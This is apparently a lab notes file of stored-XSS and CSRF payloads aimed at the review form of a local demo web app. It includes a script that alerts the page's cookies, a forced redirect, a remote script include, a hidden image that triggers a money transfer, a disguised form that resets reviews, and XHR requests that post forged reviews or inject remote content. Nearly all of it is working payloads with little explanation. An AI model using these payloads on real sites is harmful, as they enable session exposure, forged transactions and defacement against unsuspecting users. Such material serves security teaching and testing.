1.
# create a hacked review that displays all cookies
<script>
alert(document.cookie.split(';'))
</script>

2.
# create review that redirects to google
<script>window.location.href="http://www.google.com";</script>

3.
# create a review that loads a script from (remote) server
<script src="http://localhost:8080/app/script.js"></script>

4.
# create a hacked review to transfer money out of user account behind the scenes, works only if csrfToken is valid or csrfToken validation in service_auth.jsp is disabled
Get 50% discount For details click <a href="/reviews.jsp">here</a> or
<img src="http://localhost:8080/app/transfer.jsp?sender=Antek&recipient=Bartek&amount=0.1" height="1" width="1"/>
<form name="exploit" action="/reset.jsp" method="post" style="display: inline;">
    <input type="hidden" name="review" value="You have been hacked!"/>
    <input type="hidden" name="csrfToken" value="abc"/>
    <input type="submit"  style="background: none !important; border: none !important; padding: 0 !important; font-family: serif; font-size: 1em; color: blue; text-decoration: underline; cursor: pointer;" value="here"/>
    <button type="submit" style="background: none !important; border: none !important; padding: 0 !important; font-family: serif; font-size: 1em; color: blue; text-decoration: underline; cursor: pointer;">here</button>
</form>

4.
# could not load data (java script not enabled)
# create a review that loads a table cell content from (remote) server with cors control explicitly whitelisting origin url from which requests are allowed (via Access-Control-Allow-Origin header)
# by default all request from localhost to localhost add allowed
<script>
function sleep (time) {
    return new Promise((resolve) => setTimeout(resolve, time));
}
async function justGet(value) {
    document.getElementById("mytable").rows[2].cells[2].innerHTML = value
}
const xhr = new XMLHttpRequest();
// by default request only to localhost are allowed, if used other address, like ip, update target to return headers Access-Control-Allow-*
xhr.open("GET", 'http://192.168.0.29:8080/app/cors.jsp', true);
xhr.onreadystatechange = function() { // Call a function when the state changes.
    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
        justGet(xhr.responseText);
    }
    if (this.readyState === XMLHttpRequest.DONE && this.status === 404) {
        justGet("<img src=\"http://localhost:8080/app/icons/http-404.png\" width=\"20\" height=\"20\"  alt=\"not found (404)\"/>");
    }
}
xhr.onerror = function() {
    justGet("<img src=\"http://localhost:8080/app/icons/http-error.png\" width=\"20\" height=\"20\"  alt=\"http error\"/>");
}
xhr.send();
</script>



5.
# could not load data (java script not enabled)
# create a review that loads a content into table cell from (remote) server with loading icon
<script>
function sleep (time) {
    return new Promise((resolve) => setTimeout(resolve, time));
}
async function sleepAndGet(value) {
    await sleep(1000);
    document.getElementById("mytable").rows[2].cells[2].innerHTML = value
}
async function justGet(value) {
    document.getElementById("mytable").rows[2].cells[2].innerHTML = value
}
justGet("<img src=\"http://localhost:8080/app/icons/http-loading.gif\" width=\"20\" height=\"20\"  alt=\"loading\"/>");
const xhr = new XMLHttpRequest();
xhr.open("GET", 'http://localhost:8080/app/slow.jsp', true);
xhr.onreadystatechange = function() { // Call a function when the state changes.
    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
        sleepAndGet(xhr.responseText);
    }
    if (this.readyState === XMLHttpRequest.DONE && this.status === 404) {
        sleepAndGet("<img src=\"http://localhost:8080/app/icons/http-404.png\" width=\"20\" height=\"20\"  alt=\"not found (404)\"/>");
    }
}
xhr.onerror = function() {
    sleepAndGet("<img src=\"http://localhost:8080/app/icons/http-error.png\" width=\"20\" height=\"20\"  alt=\"http error\"/>");
}
xhr.send();
</script>


6.
# add hacked review, works only if csrfToken is valid or csrfToken validation in auth.jsp is disabled
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", 'http://localhost:8080/app/reviews_post_redirect_get.jsp', true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send("review=HackedReview");
</script>
xhr.send("review=HackedReview&csrfToken=abc");

7.
# display content of response from (remote) url
<script>
const xhr = new XMLHttpRequest();
xhr.open("GET", 'http://localhost:8080/app/a.txt', true);
xhr.onreadystatechange = function() { // Call a function when the state changes.
    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
        document.getElementById("mytable").rows[2].cells[2].innerHTML = xhr.responseText;
    }
}
xhr.send();
</script>
